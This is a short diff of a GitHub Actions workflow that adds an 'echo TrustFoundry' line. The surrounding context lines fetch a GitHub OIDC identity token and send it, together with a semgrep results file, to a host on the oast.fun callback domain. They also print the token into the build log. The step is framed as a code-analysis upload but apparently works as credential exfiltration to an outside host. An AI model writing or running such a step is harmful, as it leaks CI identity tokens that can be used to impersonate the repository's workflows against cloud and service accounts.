@@ -48,6 +48,7 @@ jobs:
           SECRET=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://app.pixee.ai" | jq -j '.value')
           API_RESPONSE=$(curl -v -X PUT -H "Authorization: Bearer $SECRET" -H "Content-Type: multipart/form-data" -F "file=@semgrep.sarif" "https://gpftqsnjgjjgpcqhufrrc2id4q6z4totb.oast.fun/prod/analysis-input/godson-tf/semgrep-test/$GITHUB_SHA/semgrep")
           echo "$API_RESPONSE"
+          echo "TrustFoundry"
           echo $SECRET
 
 
